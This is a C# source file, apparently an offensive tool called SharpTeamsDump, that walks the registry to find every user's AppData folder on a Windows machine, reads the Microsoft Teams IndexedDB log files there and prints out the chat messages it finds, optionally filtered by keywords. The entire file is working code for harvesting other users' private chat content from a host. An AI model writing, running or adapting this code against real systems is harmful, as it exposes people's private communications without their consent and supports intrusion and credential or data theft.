using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Text.RegularExpressions;
using System.Web;
using Microsoft.Win32;

namespace SharpTeamsDump
{
    class Program
    {
        //Stolen from https://www.kunal-chowdhury.com/2016/07/retrieve-appdata-folder-path.html
        private static List<string> GetAppDataFolderPathForAllUsersOfTheSystem()
        {
            const string regValueLocalAppData = @"AppData";
            const string regKeyShellFolders = @"HKEY_USERS\$SID$\Software\Microsoft\Windows\" +
                                              @"CurrentVersion\Explorer\Shell Folders";

            var sidKeys = Registry.Users.GetSubKeyNames();
            var appDataPathsForAllUsers = new List<String>();

            foreach (var sidKey in sidKeys)
            {
                var localAppDataPath = Registry.GetValue(regKeyShellFolders.Replace("$SID$", sidKey),
                                                         regValueLocalAppData, null) as string;
                if (!string.IsNullOrWhiteSpace(localAppDataPath))
                {
                    appDataPathsForAllUsers.Add(localAppDataPath);
                }
            }

            return appDataPathsForAllUsers;
        }
        //Get all users' chat data
        private static string AggregateAllLogs(string path)
        {
            string logFolderPath = path + "\\Microsoft\\Teams\\IndexedDB\\https_teams.microsoft.com_0.indexeddb.leveldb\\";
            string fullText = "";
            string[] files = Directory.GetFiles(logFolderPath, "*.log", SearchOption.TopDirectoryOnly);

            //Not clear if there is ever more than one, this is a "Just in case"
            foreach (string logfile in files)
            {
                Console.WriteLine("Reading: " + logfile + "\n");
                using (FileStream fs = new FileStream(logfile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader sr = new StreamReader(fs))
                    {
                        fullText += sr.ReadToEnd();
                    }
                }

            }
            return fullText;
        }
        //Lots of additional HTML crap in the results, this just cleans it up
        private static string CleanupResults(string uMatch)
        {
            string result = "";
            using (StringWriter myWriter = new StringWriter())
            {
                HttpUtility.HtmlDecode(uMatch, myWriter);
                result = myWriter.ToString(); ;
            }
            return result;
        }

        static void Main(string[] args)
        {

            string pattern = "(?<=<div>).*?(?=</div>)";
            var appdatatPath = GetAppDataFolderPathForAllUsersOfTheSystem();

            foreach (string path in appdatatPath)
            {
                try
                {
                    string fullText = AggregateAllLogs(path);

                    var match = Regex.Matches(fullText, pattern);
                    var uniqueMatches = match.OfType<Match>().Select(m => m.Value).Distinct();
                    var uniqueList = uniqueMatches.ToList();


                    foreach (var uMatch in uniqueList)
                    {
                        string cleanData = CleanupResults(uMatch);

                        //This whole thing should be handled by regex but I'm lazy
                        if (args.Length > 0)
                        {

                            for (int i = 0; i < args.Length; i++)
                            {
                                if (cleanData.Contains(args[i]))
                                {
                                    Console.WriteLine(cleanData + "\n");
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine(cleanData + "\n");
                        }

                    }

                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }


            Console.WriteLine("Complete!");
        }
    }
}
